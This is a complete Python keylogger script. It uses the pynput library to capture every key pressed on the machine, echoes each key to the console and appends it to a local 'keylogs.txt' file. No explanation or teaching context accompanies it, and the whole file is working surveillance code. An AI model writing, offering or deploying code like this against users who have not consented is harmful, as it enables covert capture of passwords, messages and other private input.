```python
import sys
import os
from pynput import keyboard

log_dir = os.path.join(sys.path[0], 'keylogs.txt')

def record_keystrokes():
    with open(log_dir, 'a') as keylog_file:
        def on_press(key):
            sequence = ""
            try:
                current_pressed_key = key.char
            except AttributeError:
                if key == keyboard.Key.space:
                    current_pressed_key = " "
                elif key == keyboard.Key.enter:
                    current_pressed_key = "\n"
                else:
                    current_pressed_key = str(key)
            sequence += current_pressed_key
            print("recording: {}".format(sequence))
            keylog_file.write(sequence)
            
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

if __name__ == "__main__":
    record_keystrokes()
```
